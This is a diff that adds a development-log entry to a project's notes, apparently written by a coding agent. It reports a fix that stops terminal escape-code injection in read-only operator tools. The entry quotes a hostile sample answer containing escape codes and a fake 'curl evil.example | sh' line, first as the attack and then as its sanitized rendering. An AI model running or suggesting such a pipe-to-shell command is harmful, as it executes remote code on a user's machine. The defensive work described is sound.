@@ -1136,3 +1136,31 @@ In all three, `verify` printed **OK** and then starting the worker printed `EVIL
 2. **Your own tools are part of the attack surface.** We'd hardened the coordinator (what strangers send it) and the worker (what it receives). The operator's tools carry the most valuable secret of all, so they need the same distrust.
 3. **A "zip bomb"** is a tiny compressed file that unpacks into something enormous. The defence is simple: ask for uncompressed replies and refuse anything compressed, so there's nothing to unpack.
 4. **"Unknown" is safer than "yes".** When a reply is broken, the tool can't tell whether the test was queued. Calling it "unknown" and never reusing that test is safer than guessing "issued" (or "not sent" and sending it twice).
+
+## 2026-11-24 (21:30 UTC): A rig's answer could take over your screen (0.5.61)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the tenth "code audit" pass. Earlier passes protected the worker and your network tools from what the *coordinator* says. This one looked at your read-only tools (`app.review`, `app.vouches`, `app.workers list`, `app.incident status`, `app.ledger_copy`) and asked: **who else wrote the text they print?**
+
+**Found, shown really happening** (a real ledger, built through the real API)
+1. **A rig's answer went straight to your terminal.** Terminals treat some invisible characters as commands ("escape codes"): clear the screen, move the cursor, rename the window, colour or hide text. Rig `wk-b` submitted an answer made of those codes plus a bold fake line, `Run: curl evil.example | sh`. Running `python -m app.review --all` (the list of held answers you'd look at to judge a dispute) printed it as-is: 5 escape codes in one answer. Any enrolled rig can get an answer into that list just by disagreeing with another rig. Job inputs from the submitter program went through the same way.
+2. **Someone else's ledger copy could do the same.** `ledger_copy info` printed the copy's note raw, and `ledger_copy compare` printed rig, job and event names read from the copies raw. Those files come from strangers by design (anyone can re-check a published copy).
+3. **Old ledgers.** Rig names, owner labels and pause reasons are checked when they're written (since 0.5.52), but a ledger from before then, or one edited by hand, could still hold anything, and `vouches`, `workers list` and `incident status` printed it raw.
+4. **The site and dependency checkers** quote website headers and security-advisory text written by other people.
+
+**Shipped (`operator-screen-v1`)**
+- **New `app/screen.py`:** one small module (needs nothing installed) with `say` (moved here from the worker's guard code) and `say_lines`, which prints every line of a text view with control codes and invisible marks shown as `?`. A line break hidden inside a value also becomes `?`, so it can't fake a line of the tool's own output (like a made-up `PASS`).
+- **Used by every view above.** The review queue now shows that answer as `?[2J?[H?]0;owned??[1mRun: curl evil.example | sh?[0m...`: visible, harmless, and obviously odd.
+- **Nothing lost:** `--json`, `compare --out` and the API still give the exact text, so you can see precisely what a rig sent (JSON writes the escape character as the six harmless characters `\u001b`).
+- **Proof.**
+  - 15 new tests, **2,211 total: 2,210 passing, 1 skipped** on the committed tree (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - **12 of the new tests fail on the old code**, including the real review command with a hostile rig.
+  - One test "poisons" every piece of text in a real review queue, vouch report and pause status at once and checks nothing harmful gets through, so a field added later is covered too.
+  - I broke the new checks 15 ways on purpose; **all 15 were caught.**
+  - Side by side on the same ledger: old code, 5 escape bytes in the output; new code, 0.
+- **Honest limits:** this covers our own text views. If you pipe `--json` into another program that decodes and prints it, that program needs the same care. Nothing needs doing on your side; no coordinator is running yet.
+
+**What you learned**
+1. **Text can be a command.** A terminal reads certain invisible characters (starting with ESC) as instructions: clear the screen, move the cursor, change the window title. Printing text from a stranger is like letting them type on your keyboard for a moment.
+2. **Ask "who wrote this?" for every line you print.** The review queue felt like a private, operator-only page, but most of what it shows (the answers) was written by rigs. "Only I can see it" isn't the same as "only I wrote it".
+3. **Show it, don't hide it.** We replace the dangerous characters with `?` instead of deleting them, so a tampered answer still *looks* tampered. Quietly cleaning it up would hide the evidence.
+4. **One choke point beats many patches.** Instead of cleaning each field, each view passes its finished lines through one function. A field someone adds next month is covered automatically, and one test can check the whole view at once.
